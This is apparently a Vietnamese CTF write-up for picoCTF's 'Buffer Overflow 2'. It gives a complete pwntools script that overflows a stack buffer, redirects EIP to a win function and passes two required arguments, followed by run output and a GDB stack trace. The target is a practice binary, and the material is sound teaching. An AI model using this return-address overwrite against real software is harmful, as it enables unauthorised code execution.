# Buffer Overflow 2

## Description

> Control the return address and arguments

## Solution

Các bước tìm offset đến EIP vẫn như BOF0 và BOF1 nên mình sẽ skip qua bước này

Trong source code có đoạn&#x20;

```c
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
```

Tức là khi ta ghi đè EIP với địa chỉ của hàm win thì ta cần phải truyền thêm 2 giá trị arg1 và arg2 để vượt điều kiện

Khi ta nhập 1 lượng buffer đủ nhiều để đến EIP và sau khi return nó sẽ nhảy sang hàm win. Đặc biệt ta cần phải tạo lại một cái stack cho hàm win tương tự như vậy:

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

## Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
exe = context.binary = ELF('./vuln', checksec=False)



# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

b*win
c
''')

p = remote('saturn.picoctf.net', 51113) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

payload = b'A'*112 # buf
payload += p32(exe.sym['win']) # EIP = win addr
payload += b'A'*4 # Junk for saved RBP
payload += p32(0xCAFEF00D) # arg1
payload += p32(0xF00DF00D) # arg2

sla(b'string:',payload)
p.interactive()

```

```bash
➜  BOF_2 python3 exploit.py
[+] Starting local process '/home/alter/Pico/pwn/BOF_2/vuln': pid 7109
[!] ASLR is disabled!
[*] Switching to interactive mode

\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA
FLAG{helloiloveyou}
```

### GDB explain

Để hiểu rõ exploit hơn ta có thể dùng GDB để debug thử

* Breakpoint tại win và xem payload của chúng ta như thế nào

```bash
Breakpoint 1, 0x08049296 in win ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────── registers ────
$eax   : 0x81
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x2aa5c8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffccd0  →  0x41414141 ("AAAA"?)
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32
$edi   : 0x2aaa9b60  →  0x00000000
$eip   : 0x08049296  →  <win+0000> endbr32
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────── stack ────
0xffffccd0│+0x0000: 0x41414141   ← $esp
0xffffccd4│+0x0004: 0xcafef00d
0xffffccd8│+0x0008: 0xf00df00d
0xffffccdc│+0x000c: 0x00000300
0xffffcce0│+0x0010: 0xffffcd00  →  0x00000001
0xffffcce4│+0x0014: 0x2aa5ae34  →  0x00228d2c
0xffffcce8│+0x0018: 0x00000000
0xffffccec│+0x001c: 0x2a856c75  →   add esp, 0x10
─────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049289 <__do_global_dtors_aux+0029> lea    esi, [esi+eiz*1+0x0]
    0x8049290 <frame_dummy+0000> endbr32
    0x8049294 <frame_dummy+0004> jmp    0x8049220 <register_tm_clones>
●→  0x8049296 <win+0000>       endbr32
    0x804929a <win+0004>       push   ebp
    0x804929b <win+0005>       mov    ebp, esp
    0x804929d <win+0007>       push   ebx
    0x804929e <win+0008>       sub    esp, 0x54
    0x80492a1 <win+000b>       call   0x80491d0 <__x86.get_pc_thunk.bx>
─────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049296 in win (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049296 → win()
────────────────────────────────────────────────────────────────────────────
gef➤  i r
eax            0x81                0x81
ecx            0x2aa5c8a0          0x2aa5c8a0
edx            0x0                 0x0
ebx            0x41414141          0x41414141
esp            0xffffccd0          0xffffccd0
ebp            0x41414141          0x41414141
esi            0x80493f0           0x80493f0
edi            0x2aaa9b60          0x2aaa9b60
eip            0x8049296           0x8049296 <win>
eflags         0x286               [ PF SF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gef➤  i r ebp esp
ebp            0x41414141          0x41414141
esp            0xffffccd0          0xffffccd0
gef➤  x $eip
0x8049296 <win>:        0xfb1e0ff3
```

Ta có thể thấy sau khi nhảy sang hàm win, payload của chúng ta đã ghi đè saved RBP với giá trị **0x41414141**
